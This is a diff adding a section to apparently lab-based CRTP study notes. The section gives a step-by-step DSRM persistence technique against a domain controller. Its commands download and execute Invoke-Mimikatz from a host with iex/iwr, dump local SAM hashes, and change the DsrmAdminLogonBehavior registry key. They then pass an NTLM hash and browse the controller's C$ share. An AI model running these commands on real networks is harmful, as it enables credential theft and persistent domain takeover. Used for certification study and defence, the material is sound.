@@ -1933,3 +1933,39 @@ mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # misc::skeleton
 mimikatz # !-
 ```
+
+# DSRM
+Every Domain Controller device contains a Local Administrator. we put the private password in this user when we create the Active Directory environment, so it is rarely used, change the password or access unless a disaster occurs in the Active Directory in order to reset the environment.
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cbfcdb2f-41d8-42b3-af04-dfbb80266380)
+
+In this technique, we will try to obtain the password for the local administrator of the domain controller so that we can implement the Pass-the-hash technique at any time to browse the share files of the domain controller
+
+In order to apply the technique, we must run a PowerShell session with a user in the domain admins group
+### Apply
+1. first thing we will access the domain controller device through this command
+```
+Enter-PSSession -ComputerName dcorp-dc
+```
+2. Next, load the Mimikatz tool using this command
+```
+iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)
+```
+3. execute this command to get the local passwords on the domain controller
+```
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3408dd39-c4af-4617-9ae2-11621abcde9f)
+4. now before we apply the Pass the hash technique, we need to add the Logon Behavior element in the registry and give it the value 2 so that we can use the NTLM hash in it.
+```
+New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD
+```
+5. now apply the Pass the hash technique using mimikatz
+```
+sekurlsa::pth /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /domain:dcorp-dc /run:powershell.exe
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3edc3112-a8ab-4740-9f59-15cdfdbc1b22)
+6. now you can explore the share files of the domain controller
+```
+dir \\dcorp-dc\C$
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3a4ec50e-3551-4563-884b-f6c29ea6498e)
